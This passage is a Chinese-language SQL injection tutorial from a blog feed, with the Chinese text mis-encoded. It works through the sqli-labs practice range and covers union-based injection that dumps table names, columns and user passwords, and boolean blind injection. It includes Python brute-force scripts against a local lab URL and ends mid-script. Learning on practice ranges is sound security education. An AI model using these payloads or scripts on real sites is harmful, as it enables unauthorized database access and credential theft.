  </entry>
  <entry>
    <title>sqlæ³¨å…¥</title>
    <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>&emsp;&emsp; å½“ç”¨æˆ·è¾“å…¥è´¦å·å’Œå¯†ç çš„æ—¶å€™ï¼Œwebåº”ç”¨ä¼šå‘åå°æ•°æ®åº“è¿›è¡Œä¸€ä¸ªåŒ¹é…ï¼Œå¦‚æœè´¦å·å¯†ç æ­£ç¡®å°±ä¼šç™»å…¥ã€‚è€Œè¿™ä¸ªæ•°æ®åº“ä¾‹å¦‚MySQL,Oracleç­‰ä¸€ç³»åˆ—ç”¨çš„è¯­å¥å«åšsqlè¯­å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ä¼ æ•°æ®çš„æ—¶å€™ï¼Œä½¿ç”¨sqlè¯­å¥ä¸Šä¼ å°±ä¼šæ”¹å˜ä¸€ä¸ªåŸæœ‰çš„ç»“æ„ï¼Œä»è€Œè·å–æˆ–ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œè€Œè¿™ä¸ªï¼Œå°±å«åšsqlæ³¨å…¥ã€‚</p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;é‚£ä¹ˆåœ¨åšsqlæ³¨å…¥çš„æ—¶å€™ï¼Œå»ºè®®å…ˆçœ‹ä¸€ä¸‹sqlè¯­å¥çš„åŸºç¡€è¯­æ³•ï¼Œæ‡‚å¾—åŸºç¡€æ‰èƒ½ç†è§£å¾—æ›´åŠ æ·±åˆ»,OKï¼Œåœ¨å­¦è¿™ä¸ªä¹‹å‰ï¼Œæˆ‘ä»¬è¦æ­é…ç€é¶åœºå»ä½¿ç”¨ï¼Œå®è·µå‡ºæ¥çš„æ•ˆæœæ›´ä½³ã€‚ç‚¹å‡»<a href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">é¶åœºç¯å¢ƒæ­å»º</a>,å½“åšä¸€ä¸ªæ¸¸æˆå»ç©ï¼Œé€šå…³å³ä¸ºèƒœåˆ©ï¼ˆæ³¨æ„phpç‰ˆæœ¬è¦é€‰æ‹©5.xç‰ˆæœ¬ï¼‰</p>
<h2 id="sqlæ³¨å…¥åŸºç¡€"><a href="#sqlæ³¨å…¥åŸºç¡€" class="headerlink" title="sqlæ³¨å…¥åŸºç¡€"></a>sqlæ³¨å…¥åŸºç¡€</h2><p>&emsp;&emsp;æˆ‘ä»¬å°±ç›´æ¥è®²æ€è·¯ä»€ä¹ˆçš„äº†ï¼Œè¯­æ³•åŸºç¡€å’Œé€»è¾‘è‡ªè¡Œå»bç«™äº†è§£ã€‚</p>
<h2 id="getè¯·æ±‚"><a href="#getè¯·æ±‚" class="headerlink" title="getè¯·æ±‚"></a>getè¯·æ±‚</h2><h3 id="åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹"></a>åˆ¤æ–­æ³¨å…¥ç‚¹</h3><p>&emsp;&emsp;æ³¨å…¥ç‚¹åˆ†ä¸ºæ•°å­—å‹å’Œå­—ç¬¦å‹ï¼ˆè¾“å…¥å­—ç¬¦é»˜è®¤ä¸ºå­—ç¬¦å‹ï¼‰ã€‚ä¸¤è€…çš„åˆ¤æ–­æ–¹å¼å¯ä»¥<font color=blue>ç”¨id&#x3D;2-1æ¥æµ‹è¯•ï¼Œå¦‚æœæ˜¯æ•°å­—å‹çš„ï¼Œå›æ˜¾çš„æ ·å¼åº”è¯¥æ˜¯id&#x3D;1çš„æƒ…å†µï¼Œå¦‚æœæ˜¯å­—ç¬¦å‹çš„ï¼Œå›æ˜¾çš„æ ·å¼åº”è¯¥æ˜¯id&#x3D;2çš„æƒ…å†µã€‚</font><br><img data-src="/images/sql/sql1-1.png" alt="sql1-1"><br>&emsp;&emsp;è¿™æ˜¯idä¸º1æ—¶çš„nameå’Œpassword<br><img data-src="/images/sql/sql1-2.png" alt="sql1-2"><br>&emsp;&emsp;è¿™æ˜¯idä¸º2æ—¶çš„nameå’Œpassword<br><img data-src="/images/sql/sql1-2-1.png" alt="sql1-2-1"><br>&emsp;&emsp;è¿™æ˜¯idä¸º2-1çš„nameå’Œpasswordï¼Œå¾ˆæ˜æ˜¾ï¼Œå’Œ2çš„æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™æ˜¯å­—ç¬¦å‹ã€‚</p>
<h3 id="åˆ¤æ–­é—­åˆæ–¹å¼"><a href="#åˆ¤æ–­é—­åˆæ–¹å¼" class="headerlink" title="åˆ¤æ–­é—­åˆæ–¹å¼"></a>åˆ¤æ–­é—­åˆæ–¹å¼</h3><p>&emsp;&emsp;å¦‚æœæ˜¯å­—ç¬¦å‹çš„è¯ï¼Œæ ¹æ®è¯­æ³•ï¼Œæ—¢ç„¶æˆ‘ä»¬è¦é‡æ–°æ„é€ ä¸€ä¸ªè¯­å¥ï¼Œæˆ‘ä»¬å°±å¾—æŠŠåé¢çš„åŸæœ¬è¯­å¥æ³¨é‡Šæ‰ï¼Œå› æ­¤æˆ‘ä»¬æ•°å€¼åé¢éœ€è¦æ·»åŠ é—­åˆç¬¦ï¼Œè¯­å¥ç»“å°¾éœ€è¦æ·»åŠ æ³¨é‡Šç¬¦ã€‚é—­åˆæ–¹å¼æœ‰<br><img data-src="/images/sql/%E6%95%B0%E5%80%BC%E9%97%AD%E5%90%88.png" alt="æ•°å€¼é—­åˆ"><br><img data-src="/images/sql/%E5%AD%97%E7%AC%A6%E9%97%AD%E5%90%88.png" alt="å­—ç¬¦é—­åˆ"><br>&emsp;&emsp;ç„¶è€Œæ³¨é‡Šç¬¦ç›®å‰åªæ‰¾åˆ°â€“+(â€“ q),#,%23è¿™ä¸‰ç§ï¼Œåˆ¤æ–­çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå¦‚æœ<font color=red>æ‰€ä½¿ç”¨çš„é—­åˆæ–¹å¼ç»“æœä¸€æ ·ï¼Œé‚£ä¹ˆè¯´æ˜ä¸æ˜¯è¯¥é—­åˆæ–¹å¼ã€‚åä¹‹å°±æ˜¯(åŒæ—¶è¿˜åº”åˆ¤æ–­æ˜¯å¦éœ€è¦æ·»åŠ æ‹¬å·)</font>æ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœè¾“å…¥1â€and 1&#x3D;1â€“ q å’Œ 1â€and 1&#x3D;2 â€“q ä¸¤æ¬¡çš„å›æ˜¾ç»“æœä¸€æ ·ï¼Œè¯´æ˜é—­åˆæ–¹å¼ä¸æ˜¯åŒå¼•å·ï¼Œå…¶ä»–åŒç†ã€‚åŸç†å°±ä¸ç”¨å¤šè®²äº†å§ï¼Œå¦‚æœçœŸæ˜¯é—­åˆç¬¦çš„è¯ï¼Œandåé¢ä¸€çœŸä¸€å‡ï¼Œåè€…è‚¯å®šæŠ¥é”™ã€‚<br><img data-src="/images/sql/and1=1.png" alt="and1=1"><br><img data-src="/images/sql/and1=2.png" alt="and1=2"><br>&emsp;&emsp;å›æ˜¾ä¸ä¸€æ ·ï¼Œé—­åˆç¬¦å·ä¸ºâ€™ï¼ˆå¯ä»¥è¯•è¯•åŒå¼•å·æ˜¯å¦å›æ˜¾æ˜¯ä¸€æ ·ï¼‰</p>
<h3 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h3><p>&emsp;&emsp;okå•Šï¼ŒçŸ¥é“é—­åˆæ–¹å¼å’Œæ³¨é‡Šç¬¦ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€æœŸé—´ç©¿æ’è¯­å¥äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å­¦ä¹ sqlæ³¨å…¥çš„ç¬¬ä¸€æ­¥è”åˆæ³¨å…¥ã€‚<br>&emsp;&emsp;ç¬¬ä¸€æ­¥:order by Xåˆ¤æ–­åˆ—æ•°ï¼ŒXé€’å¢å¾€ä¸ŠåŠ ï¼Œ<font color=blue>å¦‚æœæŠ¥é”™å°±æ˜¯è¶…è¿‡åˆ—æ•°ï¼Œæ˜¾ç¤ºæ­£å¸¸å°±æ˜¯æ²¡æœ‰è¶…å‡ºï¼Œå°±ç»§ç»­å¾€ä¸ŠåŠ ï¼Œç›´åˆ°æŠ¥é”™é€€å›æ¥ã€‚</font><br><img data-src="/images/sql/orderby.png" alt="orderby"><br>&emsp;&emsp;å¯ä»¥çœ‹åˆ°4æŠ¥é”™äº†ï¼Œæˆ‘ä»¬å°±é€€å›æ¥ï¼Œè¯´æ˜åˆ—æ•°åªæœ‰ä¸‰åˆ—ã€‚</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ç¬¬äºŒæ­¥:union select Xåˆ¤æ–­æ˜¾ç¤ºä½ï¼Œå…ˆè¾“å…¥1,2,3â€¦â€¦çœ‹é¡µé¢å›æ˜¾ï¼Œèƒ½å›æ˜¾çš„æˆ‘ä»¬å°±å¯ä»¥å†æ”¹æˆè¯­å¥ã€‚å½“ç„¶åšè¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è®©å‰é¢æ•°æ®åº“æŸ¥è¯¢ä¸åˆ°ï¼Œä»è€Œåˆ—ä¸¾å‡ºåé¢çš„åˆ—ã€‚é€šå¸¸æ”¹ä¸ºè´Ÿæ•°å°±å¯ã€‚<br><img data-src="/images/sql/select.png" alt="select"><br>&emsp;&emsp;å¯ä»¥çœ‹åˆ°2ï¼Œ3è¢«å›æ˜¾å‡ºæ¥ï¼Œå› æ­¤å¯ä»¥åœ¨2ï¼Œ3çš„ä½ç½®æ’å…¥è¯­å¥ã€‚</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ç¬¬ä¸‰æ­¥:çˆ†åº“(ä¸çˆ†ä¹Ÿè¡Œ)ï¼Œçˆ†è¡¨ï¼Œçˆ†åˆ—ï¼Œçˆ†å­—æ®µã€‚å¯ä»¥æ’å…¥è¯­å¥äº†ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨å›ºå®šå…¬å¼å°±å¯ä»¥äº†ã€‚<br>&emsp;&emsp;çˆ†åº“,è¿™é‡Œä¸ºsecurity<br><img data-src="/images/sql/sql1-%E7%88%86%E5%BA%93.png" alt="sql1-çˆ†åº“"></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;çˆ†è¡¨ï¼Œè¿™é‡Œemails,referers,uagents,users<br><img data-src="/images/sql/sql1-%E7%88%86%E8%A1%A81.png" alt="sql1-çˆ†è¡¨1"><br>&emsp;&emsp;è¿™æ˜¯å› ä¸º2åˆ—è¯­å¥å¤ªé•¿äº†ï¼Œæˆ‘ä»¬æ”¾3åˆ—å°±è¡Œ<br><img data-src="/images/sql/sql1-%E7%88%86%E8%A1%A82.png" alt="sql1-çˆ†è¡¨2"></p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">-1</span>&#x27;<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()--+</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;çˆ†åˆ—ï¼Œæ³¨æ„ï¼Œè¡¨åä¹Ÿå°±æ˜¯table_nameè¦è§†æƒ…å†µè€Œåˆ¤æ–­ï¼Œè¦çœ‹å“ªä¸ªè¡¨å°±ç”¨æŸ¥å“ªä¸ªè¡¨.<br><img data-src="/images/sql/sql1-%E7%88%86%E5%88%97.png" alt="sql1-çˆ†åˆ—"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;çˆ†å­—æ®µï¼Œç›´æ¥æŸ¥è¯¢ä½ è¦æƒ³è¦çœ‹çš„æ•°æ®ï¼Œä¾‹å¦‚æœ‰flagçš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥æŸ¥äº†ã€‚<br><img data-src="/images/sql/sql1-%E7%88%86%E5%AD%97%E6%AE%B5.png" alt="sql1-çˆ†å­—æ®µ"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,group_concat(username ,<span class="built_in">id</span> , password) <span class="keyword">from</span> users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; * from table_nameä¹Ÿå¯ä»¥å…¨éƒ¨åˆ—å‡ºæ¥ã€‚</p>
<h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>&emsp;&emsp;å­¦ä¼šäº†è”åˆæ³¨å…¥çš„æ–¹æ³•åï¼Œå‰å››å…³æ— å‹åŠ›ï¼Œç¬¬äº”å…³æµ‹è¯•çš„æ—¶å€™å‘ç°æŸ¥è¯¢ä¸åˆ°ç»“æœï¼Œåƒæ˜¯è¿™ç§çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼ŒåŒºåˆ«å°±æ˜¯ç›²æ³¨ä¸æ˜¯è¿”å›æŸ¥è¯¢åˆ°çš„ç»“æœï¼Œè€Œåªæ˜¯è¿”å›æŸ¥è¯¢æ˜¯å¦æˆåŠŸï¼Œå³<font color=red>è¿”å›æŸ¥è¯¢è¯­å¥çš„å¸ƒå°”å€¼</font>,ä¹Ÿå°±æ˜¯çœŸå’Œå‡çš„åˆ¤æ–­ã€‚å› ä¸ºæˆ‘ä»¬å¯¹å†…éƒ¨æ•°æ®åº“çš„ä¿¡æ¯äº†è§£ç”šå°‘ï¼Œæ‰€ä»¥ç›²æ³¨æ²¡æœ‰å›ºå®šçš„å…¬å¼ï¼Œéœ€è¦è¿›è¡Œä¸€å®šçš„ä¿®æ”¹ã€‚å¤§è‡´æ€è·¯æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">çˆ†åº“åé•¿åº¦</span><br><span class="line">æ ¹æ®åº“åé•¿åº¦çˆ†åº“å</span><br><span class="line">å¯¹å½“å‰åº“çˆ†è¡¨æ•°é‡</span><br><span class="line">æ ¹æ®åº“åå’Œè¡¨æ•°é‡çˆ†è¡¨åé•¿åº¦</span><br><span class="line">æ ¹æ®è¡¨åé•¿åº¦çˆ†è¡¨å</span><br><span class="line">å¯¹è¡¨çˆ†åˆ—æ•°é‡</span><br><span class="line">æ ¹æ®è¡¨åå’Œåˆ—æ•°é‡çˆ†åˆ—åé•¿åº¦</span><br><span class="line">æ ¹æ®åˆ—åé•¿åº¦çˆ†åˆ—å</span><br><span class="line">æ ¹æ®åˆ—åçˆ†æ•°æ®å€¼</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;æ€»ç»“æ¥è¯´å°±æ˜¯è·Ÿä¸Šé¢å·®ä¸å¤šçš„ï¼Œçˆ†åº“ï¼Œçˆ†è¡¨ï¼Œçˆ†åˆ—ï¼Œçˆ†å­—æ®µã€‚åªä¸è¿‡è¿™ä¸ªæ›´åŠ ç»†èŠ‚ä¸€ç‚¹ï¼Œç”¨çš„æ–¹æ³•ä¹Ÿä¸ä¸€æ ·ã€‚å¸¸ç”¨å‡½æ•°<code>substr(str,from,length)</code>è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚å…¶ä¸­ï¼Œ<font color=black>é¦–å­—ç¬¦ä¸‹æ ‡ä¸º1</font>,<code>length(str)</code>è¿”å›strä¸²é•¿åº¦ã€‚<br>&emsp;&emsp;å¤§è‡´æ­¥éª¤å¦‚ä¸‹:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select database()))&gt;9--+</span><br><span class="line"><span class="comment">#å¤§äºå·å¯ä»¥æ¢æˆå°äºå·æˆ–è€…ç­‰äºå·ï¼Œä¸»è¦æ˜¯åˆ¤æ–­æ•°æ®åº“çš„é•¿åº¦ã€‚lenfth()æ˜¯è·å–å½“å‰æ•°æ®åº“åçš„é•¿åº¦ã€‚å¦‚æœæ•°æ®åº“æ˜¯hahaé‚£ä¹ˆlength()å°±æ˜¯4</span></span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select database()),1,1))=115--+</span><br><span class="line"><span class="comment">#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)aæ˜¯è¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œbæ˜¯æˆªå–çš„ä½ç½®ï¼Œcæ˜¯æˆªå–çš„é•¿åº¦ã€‚å¸ƒå°”ç›²æ³¨æˆ‘ä»¬éƒ½æ˜¯é•¿åº¦ä¸º1å› ä¸ºæˆ‘ä»¬è¦ä¸€ä¸ªä¸ªåˆ¤æ–­å­—ç¬¦ã€‚ascii()æ˜¯å°†æˆªå–çš„å­—ç¬¦è½¬æ¢æˆå¯¹åº”çš„asciiå—ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å¾ˆå¥½ç¡®å®šæ•°å­—æ ¹æ®æ•°å­—æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ã€‚</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()))&gt;13--+</span><br><span class="line">åˆ¤æ–­æ‰€æœ‰è¡¨åå­—ç¬¦é•¿åº¦ã€‚</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),1,1))&gt;99--+</span><br><span class="line">é€ä¸€åˆ¤æ–­è¡¨å</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>))&gt;20--+</span><br><span class="line">åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>),1,1))&gt;99--+</span><br><span class="line">é€ä¸€åˆ¤æ–­å­—æ®µåã€‚</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> length((select group_concat(username,password) <span class="keyword">from</span> users))&gt;109--+</span><br><span class="line">åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦</span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> ascii(substr((select group_concat(username,password) <span class="keyword">from</span> users),1,1))&gt;50--+</span><br><span class="line">é€ä¸€æ£€æµ‹å†…å®¹ã€‚</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¦æ ¹æ®æ³¨é‡Šå»ä¿®æ”¹æ•°å€¼å’Œå±æ€§ã€‚ï¼ˆå»ºè®®æ‰‹æ‰“å’Œå°è¯•ä¿®æ”¹åçš„å˜åŒ–ï¼Œæ›´åŠ æœ‰å°è±¡ï¼‰<font color=red>æ³¨:è¿™æ˜¯é—­åˆç¬¦çš„åˆ¤æ–­è¿˜æ˜¯å’Œå‰é¢çš„ä¸€æ ·ã€‚</font><br>&emsp;&emsp;è¿™é‡Œæ˜¯ç”¨ç­‰äºå·æµ‹è¯•çš„ï¼Œ<font color=blue>ç»†èŠ‚1:å…ˆæµ‹è¯•1&#x3D;1ä¸ºçœŸçš„å›æ˜¾ï¼Œå†çœ‹lengthæ‰§è¡Œçš„æ—¶å€™ä¸ºçœŸçš„é¡µé¢ï¼Œè¿™é‡Œç­‰äº8æ˜¯è¯´æ˜æ•°æ®åº“çš„é•¿åº¦ä¸º8</font><br><img data-src="/images/sql/sql5-length.png" alt="sql5-length"></p>
<p>&emsp;&emsp;å¾—å‡ºæ¥é•¿åº¦åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨asciiç å»éå†ä¸€ä¸‹ï¼Œäººå·¥æ˜¯ä¸æ˜¯å¾ˆéº»çƒ¦ï¼Œæ‹œæ‰˜ï¼Œå’±ä»¬æ˜¯è®¡ç®—æœºï¼Œè¦ç”¨ç¼–ç¨‹~å½“ç„¶ï¼Œæ•°æ®åº“æˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥ç”¨è„šæœ¬è·‘å‡ºæ¥ã€‚</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://sql-labs:3601/Less-5/&#x27;</span>  <span class="meta"># ç›®æ ‡URL</span></span><br><span class="line">flag = <span class="string">&quot;You are in...&quot;</span>  <span class="meta"># è®¾ç½®ä¸€ä¸ªå›æ˜¾æˆåŠŸçš„å­—æ ·</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_database_length():</span><br><span class="line">    global url, flag  <span class="meta"># å…¨å±€å˜é‡</span></span><br><span class="line">    <span class="keyword">length</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        payload = f<span class="string">&quot;?id=1&#x27; and length((select database()))=&#123;length&#125;--+&quot;</span></span><br><span class="line">        response = requests.get(url + payload).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> in response:</span><br><span class="line">            <span class="keyword">length</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;æ•°æ®åº“é•¿åº¦ä¸º&quot;</span>, <span class="keyword">length</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">length</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;</span>)</span><br><span class="line">    <span class="keyword">length</span> = get_database_length()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å›æ˜¾é•¿åº¦ä¸º8ï¼Œä¸‹ä¸€æ­¥éå†è·å–æ•°æ®åº“åã€‚æ ¹æ®ä¸Šé¢æä¾›çš„å…¬å¼æƒ³å¥½è¦æ”¹å˜å“ªäº›æ•°ï¼Œ<font color=blue>ç»†èŠ‚2:asciiå¸¸è§„å­—ç¬¦ä¸º0-127åŒºé—´å†…ï¼Œå…¶ä¸­A(65)-Z(90),a(97)-z(122)</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag, url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + payload).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“åä¸º&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;</span>)</span><br><span class="line">    length = get_database_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“å&quot;</span>)</span><br><span class="line">    length_name = get_database_length2(length)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;éå†å‡ºæ•°æ®åº“åsecurityï¼Œé‚£ä¹ˆå…¶ä»–åŒç†ï¼Œåªè¦å°†payloadæ”¹ä¸€ä¸‹ä¸‹å°±å¯ä»¥äº†ã€‚åˆ¤æ–­è¡¨é•¿åº¦</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">def get_table_<span class="meta">length</span>():</span><br><span class="line">    global flag, url</span><br><span class="line">    <span class="keyword">length</span> = 1</span><br><span class="line">    <span class="keyword">while</span>(1):</span><br><span class="line">        payload = f<span class="string">&quot;?id=1&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=&#123;length&#125;--+&quot;</span></span><br><span class="line">        response = requests.get(url + payload).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="keyword">length</span> += 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pr<span class="meta">int</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            break</span><br><span class="line">    pr<span class="meta">int</span>(<span class="string">&quot;è¡¨é•¿åº¦ä¸º&quot;</span>,<span class="keyword">length</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">length</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pr<span class="meta">int</span>(<span class="string">&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;</span>)</span><br><span class="line">    <span class="keyword">length</span> = get_database_<span class="meta">length</span>()</span><br><span class="line">    pr<span class="meta">int</span>(<span class="string">&quot;è·å–æ•°æ®åº“å&quot;</span>)</span><br><span class="line">    length_name = get_database_length2(<span class="keyword">length</span>)</span><br><span class="line">    pr<span class="meta">int</span>(<span class="string">&quot;è·å–è¡¨é•¿åº¦&quot;</span>)</span><br><span class="line">    table_length = get_table_<span class="meta">length</span>()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è·Ÿè·å–æ•°æ®åº“é•¿åº¦æ˜¯ä¸€æ ·çš„ï¼Œæ³¨æ„payloadå°±è¡Œï¼Œå¾—å‡ºè¡¨é•¿åº¦ä¸º29ï¼Œä¸‹ä¸€æ­¥è¡¨åï¼Œè€æ ·å­ï¼Œæ”¹payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(<span class="params">table_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag, url</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, table_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + payload).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                table_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;è¡¨åä¸º&quot;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> table_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;</span>)</span><br><span class="line">    length = get_database_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“å&quot;</span>)</span><br><span 